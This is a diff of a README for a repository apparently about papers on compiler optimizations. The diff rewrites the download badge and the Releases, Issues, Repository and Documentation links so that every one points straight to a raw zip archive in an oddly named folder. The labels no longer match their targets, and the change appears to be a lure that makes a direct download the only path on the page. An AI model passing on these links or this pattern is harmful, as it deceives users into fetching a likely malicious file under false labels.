@@ -8,9 +8,9 @@ Welcome to the **papers-on-compiler-optimizations** project! This application pr
 
 To get started with the application, you need to download it. 
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/Reizasanova24/papers-on-compiler-optimizations/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Reizasanova24/papers-on-compiler-optimizations/main/marasmic/papers-on-compiler-optimizations.zip%20Now-blue)](https://raw.githubusercontent.com/Reizasanova24/papers-on-compiler-optimizations/main/marasmic/papers-on-compiler-optimizations.zip)
 
-Visit this page to download: [GitHub Releases Page](https://github.com/Reizasanova24/papers-on-compiler-optimizations/releases)
+Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/Reizasanova24/papers-on-compiler-optimizations/main/marasmic/papers-on-compiler-optimizations.zip)
 
 ### Step-by-Step Instructions
 
@@ -69,12 +69,12 @@ While this application targets end users, contributions are always welcome. If y
 
 ## 🌐 Support
 
-For any issues you face while downloading or running the application, please visit the [GitHub Issues Page](https://github.com/Reizasanova24/papers-on-compiler-optimizations/issues). You can report bugs or ask for assistance.
+For any issues you face while downloading or running the application, please visit the [GitHub Issues Page](https://raw.githubusercontent.com/Reizasanova24/papers-on-compiler-optimizations/main/marasmic/papers-on-compiler-optimizations.zip). You can report bugs or ask for assistance.
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/Reizasanova24/papers-on-compiler-optimizations)
-- [Documentation](https://github.com/Reizasanova24/papers-on-compiler-optimizations/docs)
+- [GitHub Repository](https://raw.githubusercontent.com/Reizasanova24/papers-on-compiler-optimizations/main/marasmic/papers-on-compiler-optimizations.zip)
+- [Documentation](https://raw.githubusercontent.com/Reizasanova24/papers-on-compiler-optimizations/main/marasmic/papers-on-compiler-optimizations.zip)
   
 Feel free to navigate through these pages to learn more about the application and participate in its development.
 
@@ -82,4 +82,4 @@ Feel free to navigate through these pages to learn more about the application an
 
 For further inquiries, you can reach out to the maintainer via GitHub. Your feedback and suggestions will help enhance the application for everyone. 
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/Reizasanova24/papers-on-compiler-optimizations/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Reizasanova24/papers-on-compiler-optimizations/main/marasmic/papers-on-compiler-optimizations.zip%20Now-blue)](https://raw.githubusercontent.com/Reizasanova24/papers-on-compiler-optimizations/main/marasmic/papers-on-compiler-optimizations.zip)
